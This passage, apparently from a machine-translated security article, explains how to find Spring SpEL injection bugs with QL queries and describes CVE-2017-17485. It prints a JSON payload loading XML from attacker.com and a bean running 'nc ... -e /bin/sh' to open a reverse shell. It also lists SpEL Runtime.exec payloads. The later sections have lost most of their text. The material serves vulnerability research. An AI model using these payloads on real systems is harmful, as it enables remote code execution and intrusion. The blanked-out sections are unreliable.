Kemudian kami membuat pilihan semua metode yang memenuhi persyaratan kami, misalnya, dengan menggambarkan terjadinya variabel dalam metode yang akan membersihkan dan kondisi tidak jatuh ke dalam metode ini. </p><br><p><img src="https://habrastorage.org/webt/or/cs/bu/orcsbusthzp51u1y_l0wuupohe8.png"></p><br><p>  Jadi, apa yang perlu dilakukan untuk menemukan kerentanan CVE 2018-1273? <br>  Setelah menerima dan menghubungkan gambar proyek, kami menggunakan konsol QL untuk menggambarkan pohon panggilan yang menarik minat kami.  Untuk melakukan ini: <br>  Kami menggambarkan kelas parser Ekspresi: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ExpressionParser</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">RefType</span></span></span><span class="hljs-class"> </span></span>{ ExpressionParser() { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hasQualifiedName(<span class="hljs-string"><span class="hljs-string">"org.springframework.expression"</span></span>, <span class="hljs-string"><span class="hljs-string">"ExpressionParser"</span></span>) } }</code> </pre> <br><p>  Dan metode yang bisa digunakan untuk eksekusi di dalam kelas ExpressionParser: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ParseExpression</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ ParseExpression() { exists (Method m | (m.getName().matches(<span class="hljs-string"><span class="hljs-string">"parse%"</span></span>) or m.hasName(<span class="hljs-string"><span class="hljs-string">"doParseExpression"</span></span>)) and <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() = m ) } }</code> </pre> <br><p>  Sekarang Anda harus menghubungkan deskripsi ini satu sama lain dan membuat pilihan: </p><br><pre> <code class="sql hljs">from ParseExpression expr where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr</code> </pre> <br><p>  Kueri seperti itu akan mengembalikan semua metode yang dimulai dengan parse atau dengan nama doParseExpression yang akan menjadi milik kelas ExpressionParser.  Tapi itu terlalu banyak, katamu, dan kamu akan benar.  Diperlukan filter. </p><br><p>  Karena  dalam kode ada komentar berupa: </p><br><pre> <code class="sql hljs">* Converts a patch path to an {@link Expression}. * * @param path the patch path to convert.</code> </pre> <br><p>  Itu bisa, misalnya, pencarian "jalan" di Javadoc.  Beri komentar pada kodenya dalam kualitas yang sangat tinggi, dan kami dapat menemukan panggilan metode dengan komentar yang diperlukan, dan pada saat yang sama menghapus semua metode yang termasuk dalam pengujian.  Semua ini dapat digambarkan sebagai berikut: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">CallHasPath</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Callable</span></span></span><span class="hljs-class"> </span></span>{ CallHasPath() { not <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getDeclaringType() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> TestClass </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">and</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">( </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getDoc()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath or </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">this</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDeclaringType</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath ) } }</span></span></code> </pre> <br><p>  Kemudian, untuk menggabungkan kelas, metode, dan filter oleh Javadoc, kueri untuk pemilihan akan mengambil bentuk berikut: </p><br><pre> <code class="sql hljs">from ParseExpression expr, CallHasPath c where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser and c = expr.getEnclosingCallable()) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr, c</code> </pre> <br><p>  Contoh ini dapat dianggap sederhana dan, secara umum, berlebihan untuk mencari kerentanan tertentu.  Jauh lebih menarik adalah mencari kesalahan saat menulis perbaikan, karena  di dalamnya, Anda perlu menentukan kelas itu sendiri, yang bertanggung jawab untuk memeriksa, metode yang selalu memanggilnya dan yang dieksekusi sebelum diperiksa. </p><br><p>  Panggilan ke metode yang selalu memanggil verifikasiPath: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">VerifyPathCallerAccess</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ VerifyPathCallerAccess() { exists(VerifyPathActionConf conf | conf.callAlwaysPerformsAction(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>) ) or <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> VerifyPath } }</code> </pre> <br><p>  Panggilan ke metode yang dijalankan sebelum memverifikasiPath: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UnsafeEvaluateCall</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ UnsafeEvaluateCall() { ( <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> Evaluate or </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(UnsafeEvaluateCall unsafe | </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getMethod()</span></span></span><span class="hljs-function"> </span></span>= unsafe.getEnclosingCallable() ) ) <span class="hljs-function"><span class="hljs-function">and not </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(VerifyPathCallerAccess verify | dominates(verify, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> ) } }</span></span></code> </pre> <br><p>  Pertimbangkan kerentanan lain yang menarik.  Pemahamannya sangat penting, karena  itu menunjukkan bahwa kesalahan mungkin di perpustakaan pihak ketiga, dan menunjukkan bagaimana kacang XML beranotasi dapat digunakan. </p><br><h2 id="jackson-and-bean">  Jackson dan kacang </h2><br><p>  CVE-2017-17485 didasarkan pada penggunaan FileSystemXmlApplicationContext - itu adalah konteks aplikasi yang berdiri sendiri dalam bentuk XML yang menerima file definisi konteks dari sistem file atau dari URL. </p><br><p>  Menurut dokumentasi, ini memungkinkan Anda untuk memuat kacang dari file dan memuat kembali konteks aplikasi. <br>  "... Buat FileSystemXmlApplicationContext baru, memuat definisi dari file XML yang diberikan dan secara otomatis menyegarkan konteksnya" </p><br><p>  Jackson adalah pustaka yang memungkinkan Anda untuk membuat serial dan deserialisasi objek apa pun kecuali yang masuk daftar hitam.  Peluang ini sering digunakan oleh penyerang.  Dalam hal kerentanan ini, penyerang harus melewati <code>org.springframework.context.support.FileSystemXmlApplicationContext</code> objek dengan nilai yang berisi path ke file yang dikendalikan oleh penyerang. </p><br><p>  Yaitu  di badan permintaan Anda bisa melewati JSON berikut: </p><br><pre> <code class="json hljs">{<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-attr"><span class="hljs-attr">"obj"</span></span>: [<span class="hljs-string"><span class="hljs-string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span></span>, <span class="hljs-string"><span class="hljs-string">"https://attacker.com/spel.xml"</span></span>]}</code> </pre> <br><p>  Spel.xml akan berisi parameter bin: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"pb"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.ProcessBuilder"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value-type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.String"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>nc<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>XXXX<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>9999<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>-e<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>/bin/sh<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"whatever"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{pb.start()}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Karena  Karena kami menggunakan kelas java.lang.ProcessBuilder, yang memiliki metode mulai, setelah memuat ulang konteksnya, Spring membaca ekspresi yang memulai ProcessBuilder dari properti SpEL, sehingga memaksa server untuk terhubung ke kami menggunakan nc. </p><br><p>  Perlu memperhatikan spel.xml yang diberikan sebagai contoh, sebagai  ini menunjukkan cara untuk melewatkan parameter saat menjalankan perintah. </p><br><p>  Dan dengan cara apa lagi kita dapat memuat kacang kita atau memuat ulang konteksnya? </p><br><p>  Bahkan dengan melihat sekilas pada dokumentasi Spring, Anda dapat menemukan beberapa kelas lagi yang mungkin berguna bagi kami. </p><br><p>  ClassPathXmlApplicationContext dan AbstractXmlApplicationContext mirip dengan FileSystem, tetapi ClassPath- dan XML-annotated beans masing-masing digunakan sebagai jalur konfigurasi. </p><br><p>  Ada hal menarik lainnya terkait reload konteks - @RefreshScope. </p><br><p>  Semua Spring Bean yang dianotasi dengan @RefreshScope akan diperbarui saat peluncuran.  Dan semua komponen yang menggunakannya akan menerima objek baru pada saat metode ini dipanggil, mereka akan sepenuhnya diinisialisasi dan diperkenalkan tergantung. </p><br><p>  RefreshScope adalah komponen dalam konteks, dan ia memiliki metode refreshAll publik yang dirancang untuk memperbarui semua komponen di suatu daerah dengan membersihkan cache target.  Oleh karena itu, ketika menggunakan @RefreshScope, pengguna dapat mengakses URL yang diakhiri dengan / refresh, dan dengan demikian memuat ulang kacang beranotasi. </p><br><h2 id="drugie-utility">  Utilitas lain </h2><br><p>  Ada banyak plugin dan program lain yang memungkinkan Anda untuk menganalisis kode dan menemukan kerentanannya. </p><br><ul><li>  Jprofiler - diinstal sebagai aplikasi terpisah - server dan plugin untuk IDE.  Memungkinkan Anda menganalisis aplikasi yang sedang berjalan.  Sangat mudah untuk menganalisis perilaku objek melalui grafik. </li></ul><br><p><img src="https://habrastorage.org/webt/g4/ki/ij/g4kiijoeylzhjo742es00a_ksti.png"></p><br><p>  Dari minus - dibayar, tetapi memiliki masa bebas 10 hari.  Ini dianggap sebagai salah satu utilitas terbaik untuk menganalisis perilaku aplikasi, tidak hanya dari sudut pandang keamanan. </p><br><ul><li>  Xrebel - bayar, kami tidak menemukan kemungkinan masa percobaan.  Tetapi juga dianggap salah satu yang terbaik. </li><li>  Coverity - menggunakan server sendiri untuk analisis, oleh karena itu hanya nyaman bagi mereka yang tidak takut untuk mengeluarkan kode mereka. </li><li>  Checkmarx - sangat terkenal, berbayar, tahu banyak bahasa dan banyak kesalahan positif.  Tetapi lebih baik menunjuk ke tempat di mana teori mungkin memiliki kesalahan daripada melewatkan kesalahan nyata. </li><li>  Pemeriksaan Ketergantungan OWASP - disediakan sebagai plug-in yang nyaman untuk berbagai pembangun.  Kami berhasil mengujinya untuk Maven dan Ant ketika menganalisis aplikasi Java.  Juga mendukung .Net.  Menurut hasil pekerjaan, itu menyediakan laporan yang nyaman menunjukkan perpustakaan usang dan kerentanan yang diketahui oleh mereka. </li><li>  Findbugs - itu sudah disebutkan sebelumnya.  Ini memiliki banyak implementasi, tetapi opsi findbugs_cli ternyata menjadi yang paling nyaman dan untuk beberapa alasan menunjukkan lebih banyak masalah.  Dapat digunakan sebagai berikut: <br><pre> <code class="bash hljs">findsecbugs.bat -progress -html -output report_name.htm <span class="hljs-string"><span class="hljs-string">"path\example.jar"</span></span></code> </pre> </li><li>  LGTM QL - Contoh penggunaannya telah diberikan sebelumnya.  Kami ingin mengatakan secara terpisah bahwa ada juga kasus penggunaan berbayar, setelah itu Anda akan menerima server lokal untuk menganalisis kode Anda. <br> QL    Java,             . </li></ul><br><h1 id="black-box"> Black Box </h1><br><p>  -,   . <br>  ,    : Spring,     SpEL, ,  SpEL API,   -,        . </p><br><p>         spring,      URL,    API.        /metrics  /beans ‚Äî     Spring Boot Actuator     ,        . </p><br><p>  ,    . </p><br><p>    , SpEL      ,     ,    . </p><br><ul><li>  : <code>var[SpEL]=123</code> </li><li>  : <code>&amp;variable1=123&amp;SpEL=</code> </li><li> : org.springframework.cookie = <code>${}</code> </li><li>     .. </li></ul><br><h2 id="vot-nebolshaya-podborka-s-variantami-peylodov">      : </h2><br><pre> <code class="javascript hljs">${<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-number"><span class="hljs-number">3</span></span>} T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">"nslookup !url!"</span></span>) #<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getClass().forName(<span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span>).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> java.lang.ProcessBuilder({<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>}).start() ${user.name}</code> </pre> <br><h1 id="ne-spelom-ediny">  SpEL  </h1><br><p>    SpEL    ,   ,     EL Injection.    : OGNL, MVEL, JBoss EL, JSP EL.   -        . </p><br><h1 id="v-kachestve-zaklyucheniya">    </h1><br><p>  ZeroNights  : ‚Äú ,  Spring,   SpEL injection?‚Äù </p><br><p>   ,    CVE,   .       ,     ,   github. </p><br><p>  ,   ,            SpEL Expression.  Yaitu  (,   )        ,      . </p><br><p>  Yaitu            .      ,          ,       ‚Äú‚Äù . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id433034/">https://habr.com/ru/post/id433034/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id433014/index.html">Lelucon tentang pelepasan astronot baru-baru ini ke luar angkasa</a></li>
<li><a href="../id433016/index.html">Perubahan antarmuka, animasi berlapis, dan kekacauan visual terstruktur: tinjauan tren web untuk 2019</a></li>
<li><a href="../id433018/index.html">UDB. Apa ini Bagian 2. Datapath</a></li>
<li><a href="../id433030/index.html">Live: kinerja front-end</a></li>
<li><a href="../id433032/index.html">Cara kerja perutean medis - kami memberi tahu contoh aplikasi DOC +</a></li>
<li><a href="../id433036/index.html">Kiat untuk Mengatur TI dalam Bisnis Kecil</a></li>
<li><a href="../id433038/index.html">Mengapa pemasar belajar pemrograman</a></li>
<li><a href="../id433042/index.html">Intel akan merilis prosesor dengan arsitektur tiga dimensi Foveros pada 2019</a></li>
<li><a href="../id433044/index.html">Kode sumber OpenJDK mengandung terlalu banyak kata-kata umpatan</a></li>
<li><a href="../id433046/index.html">Seluruh kebenaran tentang RTOS. Artikel # 25. Saluran Data: Pengantar dan Layanan Dasar</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>